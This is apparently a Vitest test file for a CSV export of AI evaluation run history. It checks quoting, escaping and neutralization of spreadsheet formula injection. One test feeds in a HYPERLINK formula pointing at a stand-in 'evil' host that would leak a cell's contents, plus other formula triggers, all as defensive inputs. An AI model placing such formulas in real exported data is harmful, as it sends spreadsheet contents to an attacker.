import { describe, expect, it } from "vitest";
import { historyCsv } from "../../main/resources/public/modules/eval-export.js";

const RUNS = [
  {
    savedAt: "2026-07-02T10:00:00Z",
    flavor: "antigravity-cli",
    modelLabel: "gemini · v2",
    sessionCount: 20,
    evaluatedSessions: 8,
    avgScore: 75,
    judged: true,
    judgedSessions: 3,
    avgFaithfulness: 4.5,
    avgActionability: 3,
    avgClarity: 4,
    checkPassRates: [
      { name: "schema-complete", count: 8 },
      { name: "not-degenerate", count: 6 },
    ],
  },
  {
    savedAt: "2026-07-01T10:00:00Z",
    flavor: "antigravity-cli",
    modelLabel: "gemini · v1",
    sessionCount: 20,
    evaluatedSessions: 8,
    avgScore: 70,
    judged: false,
    judgedSessions: 0,
    avgFaithfulness: 0,
    avgActionability: 0,
    avgClarity: 0,
    checkPassRates: [{ name: "schema-complete", count: 7 }],
  },
];

describe("historyCsv", () => {
  it("emits a header row and one row per run", () => {
    const csv = historyCsv(RUNS);
    const lines = csv.trimEnd().split("\n");
    expect(lines).toHaveLength(3); // header + 2 runs
    expect(lines[0]).toBe(
      "savedAt,flavor,modelLabel,sessionCount,evaluatedSessions,avgScore,judged,judgedSessions,avgFaithfulness,avgActionability,avgClarity,check:schema-complete,check:not-degenerate"
    );
    expect(lines[1]).toContain("2026-07-02T10:00:00Z,antigravity-cli,gemini · v2,20,8,75,true,3,4.5,3,4");
    expect(lines[2]).toContain(",70,false,0,0,0,0");
  });

  it("adds a column per check with each run's pass count (blank when absent)", () => {
    const csv = historyCsv(RUNS);
    const lines = csv.trimEnd().split("\n");
    // Union of check names across runs, in first-seen order.
    expect(lines[0].endsWith("check:schema-complete,check:not-degenerate")).toBe(true);
    // Run 1 passed both; run 2 only has schema-complete, so its not-degenerate cell is blank.
    expect(lines[1].endsWith(",8,6")).toBe(true);
    expect(lines[2].endsWith(",7,")).toBe(true);
  });

  it("quotes and escapes fields containing commas or quotes", () => {
    const csv = historyCsv([
      { savedAt: "t", flavor: "codex", modelLabel: 'weird, "quoted" model', avgScore: 1 },
    ]);
    expect(csv).toContain('"weird, ""quoted"" model"');
  });

  it("neutralizes cells that would be read as spreadsheet formulas", () => {
    const csv = historyCsv([
      {
        savedAt: "t",
        flavor: "@SUM(1+1)",
        modelLabel: '=HYPERLINK("http://evil/"&A2,"score")',
      },
    ]);
    expect(csv).toContain(
      '"\'=HYPERLINK(""http://evil/""&A2,""score"")"' // apostrophe-prefixed, still readable
    );
    expect(csv).toContain("\"'@SUM(1+1)\"");
  });

  it("neutralizes every formula trigger, including a leading tab or carriage return", () => {
    for (const value of ["=1+1", "+1+1", "-1+1", "@A1", "\t=1+1", "\r=1+1"]) {
      const csv = historyCsv([{ savedAt: "t", modelLabel: value }]);
      expect(csv).toContain(`"'${value}"`);
    }
  });

  it("leaves ordinary numbers alone, including negatives", () => {
    const csv = historyCsv([
      {
        savedAt: "t",
        avgScore: -1.5,
        avgFaithfulness: "-2",
        avgActionability: "+3",
        avgClarity: "-1.5e3",
      },
    ]);
    expect(csv).not.toContain("'");
    expect(csv).toContain(",-1.5,");
    expect(csv.trimEnd().split("\n")[1]).toContain("-2,+3,-1.5e3");
  });

  it("quotes a carriage return so a stored value cannot start a new row", () => {
    const csv = historyCsv([
      { savedAt: "t", modelLabel: "gemini\r=HYPERLINK(0)" },
    ]);
    expect(csv).toContain('"gemini\r=HYPERLINK(0)"');
  });

  it("escapes check names in the header row", () => {
    const csv = historyCsv([
      { savedAt: "t", checkPassRates: [{ name: 'odd, "name"', count: 1 }] },
    ]);
    expect(csv.split("\n")[0]).toContain('"check:odd, ""name"""');
  });

  it("handles an empty history (header only)", () => {
    const csv = historyCsv([]);
    expect(csv.trimEnd().split("\n")).toHaveLength(1);
    expect(csv).toContain("savedAt,flavor,modelLabel");
  });
});
